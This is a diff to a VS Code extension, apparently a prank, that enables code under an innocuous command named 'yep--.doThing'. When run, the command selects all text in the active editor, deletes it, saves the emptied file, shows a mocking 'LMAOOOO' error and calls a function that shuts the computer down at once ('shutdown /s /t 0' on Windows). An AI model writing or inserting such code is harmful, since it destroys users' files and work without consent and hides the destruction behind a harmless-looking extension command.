@@ -5,10 +5,10 @@ export function activate(context: vscode.ExtensionContext) {
   let disposable = vscode.commands.registerCommand('yep--.doThing', () => {
     const editor = vscode.window.activeTextEditor;
     if (editor && vscode.workspace.workspaceFolders) {
-      vscode.window.showWarningMessage("Good luck");
-      // vscode.commands.executeCommand("editor.action.selectAll"); // Select everything
-      // vscode.commands.executeCommand("deleteLeft"); // press Backspace
-      // vscode.commands.executeCommand("workbench.action.files.save"); // press Ctrl+S to save
+      vscode.window.showInformationMessage("Good luck");
+      vscode.commands.executeCommand("editor.action.selectAll"); // Select everything
+      vscode.commands.executeCommand("deleteLeft"); // press Backspace
+      vscode.commands.executeCommand("workbench.action.files.save"); // press Ctrl+S to save
       shutDownComputer();
     }
   });
@@ -23,6 +23,7 @@ export function activate(context: vscode.ExtensionContext) {
 export function deactivate() {}
 
 export function shutDownComputer() {
+    vscode.window.showErrorMessage("LMAOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOoo");
     let command;
     if (process.platform === 'win32') {
         command = 'shutdown /s /t 0';
